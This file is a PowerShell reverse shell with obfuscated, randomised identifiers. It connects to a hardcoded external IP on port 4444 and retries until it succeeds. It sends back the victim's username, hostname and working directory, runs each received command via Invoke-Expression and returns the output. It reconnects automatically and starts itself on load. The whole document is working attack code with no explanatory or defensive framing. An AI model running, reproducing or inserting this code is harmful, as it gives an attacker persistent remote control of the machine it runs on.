class zQblMVCZk {
    
    [string]$HJEkstgPwzkeKpknTSqA = "93.49.240.195"
    [int]$EKkElryGoVRcmlGGCWiMzSB = 4444

    $PMYriGu
    $VnvYSGoXzzsPALuzsbwa
    $aLzUDZWJlFMgjfFBoOXaUOiB
    $GmioRUKihpiAw
    $EIsBLBEIPfFhDFkB
    $jpqVlihAq
    [int]$hjEVrtG = 50*1024

    SLkyBGlJQdpbCpLjWAlzZtIU() {
        $this.VnvYSGoXzzsPALuzsbwa = $false
        while ($true) {
            try {
                $this.VnvYSGoXzzsPALuzsbwa = New-Object Net.Sockets.TcpClient($this.HJEkstgPwzkeKpknTSqA, $this.EKkElryGoVRcmlGGCWiMzSB)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.WPemHdRheCwPvVQmBWAitKn()
    }

    WPemHdRheCwPvVQmBWAitKn() {
        $this.PMYriGu = $this.VnvYSGoXzzsPALuzsbwa.GetStream()
        $this.GmioRUKihpiAw = New-Object Byte[] $this.hjEVrtG
        $this.jpqVlihAq = New-Object Text.UTF8Encoding
        $this.aLzUDZWJlFMgjfFBoOXaUOiB = New-Object IO.StreamWriter($this.PMYriGu, [Text.Encoding]::UTF8, $this.hjEVrtG)
        $this.EIsBLBEIPfFhDFkB = New-Object System.IO.StreamReader($this.PMYriGu)
        $this.aLzUDZWJlFMgjfFBoOXaUOiB.AutoFlush = $true
    }

    UhuBlORi() {
        $this.SLkyBGlJQdpbCpLjWAlzZtIU()
        $this.AhskETiaUfyng()
    }

    ncnsJcgEpBfxP($DSxDXtRyjfuRHMiazanrhfFA) {
        try {
            [byte[]]$jDNMxBHoQQhmwqLNWKYXkuL = [text.Encoding]::Ascii.GetBytes($DSxDXtRyjfuRHMiazanrhfFA)
            $this.aLzUDZWJlFMgjfFBoOXaUOiB.Write($jDNMxBHoQQhmwqLNWKYXkuL, 0, $jDNMxBHoQQhmwqLNWKYXkuL.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.UhuBlORi()
        }
    }

    [string] pFamPKdlsZgOBBmr() {
        try {
            $zvtfo = $this.PMYriGu.Read($this.GmioRUKihpiAw, 0, $this.hjEVrtG)    
            $eAHfikXmHzqLfobPreim = ($this.jpqVlihAq.GetString($this.GmioRUKihpiAw, 0, $zvtfo))
            return $eAHfikXmHzqLfobPreim
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.UhuBlORi()
            return ""
        }
    }

    [string] WoACjxdJNytDJknazS($LgkCHnkhFJkMiDlScwKx) {
        Write-Host $LgkCHnkhFJkMiDlScwKx
        try { 
            $ZiXTWsgdOlqyFxJeqYH = Invoke-Expression $LgkCHnkhFJkMiDlScwKx | Out-String
        }
        catch {
            $bsOUVXESWncwKhfDy = $_.Exception
            $XEGhectwLDsZdrD = $_.Message
            $ZiXTWsgdOlqyFxJeqYH = "`n$_`n"
        }
        return $ZiXTWsgdOlqyFxJeqYH
    }

    [string] AKIqTIDusnQo() {
        $NPhScx = [Environment]::UserName
        $WNfKjb = [System.Net.Dns]::GetHostName()
        $HrtoZdnRxJfdomRXC = Get-Location
        return "$NPhScx@$WNfKjb [$HrtoZdnRxJfdomRXC]~$ "
    }

    AhskETiaUfyng() {
        while ($this.VnvYSGoXzzsPALuzsbwa.Connected) {
            $this.ncnsJcgEpBfxP($this.AKIqTIDusnQo())         
            $eAHfikXmHzqLfobPreim = $this.pFamPKdlsZgOBBmr()
            $ZiXTWsgdOlqyFxJeqYH = "`n"
            if ([string]::IsNullOrEmpty($eAHfikXmHzqLfobPreim)) {
                continue
            }
            $ZiXTWsgdOlqyFxJeqYH = $this.WoACjxdJNytDJknazS($eAHfikXmHzqLfobPreim)
            $this.ncnsJcgEpBfxP($ZiXTWsgdOlqyFxJeqYH + "`n")
            $this.PMYriGu.Flush()
        }
        $this.VnvYSGoXzzsPALuzsbwa.Close()
        $this.UhuBlORi()
    } 
}

$nbtWItQBhsCpjEJfLnPna = [zQblMVCZk]::new()
$nbtWItQBhsCpjEJfLnPna.UhuBlORi()
